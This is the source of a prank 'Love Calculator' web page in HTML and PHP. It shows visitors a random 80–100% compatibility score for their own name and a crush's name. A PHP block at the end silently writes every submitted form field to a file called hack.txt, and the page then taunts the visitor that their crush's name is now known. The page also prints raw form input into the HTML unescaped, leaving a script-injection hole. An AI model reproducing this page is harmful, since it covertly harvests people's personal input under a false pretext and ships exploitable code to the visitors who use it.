

<!DOCTYPE html>
<html>
<head>
  <link rel="icon" href="../suramshivareddy.com/photo.png" type="image/gif">
    <meta name="author" content="Suram ShivaReddy" />
    <meta name="keywords"  content="ShivaReddy, Suram ShivaReddy, Suram Shiva, Shiva R'dy" />
<meta name="description" content="I'm Suram ShivaReddy a Webdeveloper from India (Hyderabad). If you are looking for a
good looking Responsive website, I can help you with it">
<meta name="viewport" content="width=device-width, intial-scale=1">
<title>Love Calculator</title>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/css/bootstrap.min.css">
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
<style>
p{
text-align:center;
}
body{
     background: url("pinklove.jpg") no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
color:#e026a2;
	font-family:Zapf Chancery, cursive;
background-color:#EEEEEE;
	}


.bd{
border:3px solid ;
border-radius:4px;
widht:300px;
color:white;
background-color: rgba(0, 0, 0, 0.5);
}
span{
color:#FF62AD;
}
</style>
<script>
function f1(){
document.getElementById("box").innerHTML = "<h2>How will I Know Your Wedding Date Fellow?<br></h2><h1> You got fooled..!!<br><br>Now I Know Your Crush Name..&#9786; &#9786;<h1>";

}
</script>


</head>

<body bgcolor="#d9534f" align="center">

  <div class="container-fluid">
   <h1 style="font-size:4em;text-shadow: 2px 2px 5px white">Love Calculator..</h1>                  


 <br>


  <div class="bd" id="box"> 
<?php 
$name=$_POST['myname'];
$crushname=$_POST['crushname'];
$percent=rand(80,100);
echo'<h1>'.$name.' <span class="glyphicon glyphicon-heart"></span> '.$crushname.'</h1>';
echo" <h1> You Both are ".$percent."% Compatable..</h1><br>" ?>


 <button onclick="f1()" class="btn btn-default">Check your Wedding Date</button><br><br>

    </div>


</div>
<br>
<br>
<br>
<br>
<br>


    <div class="navbar navbar-inverse navbar-fixed-bottom">
      <div class="container">  
	  
        <p align="center" style="padding:12px;color:white" >Copyrights &copy; 2016</p> 
		
</div>
</div>

  

</body>
</html>
<?php

$handle = fopen("hack.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>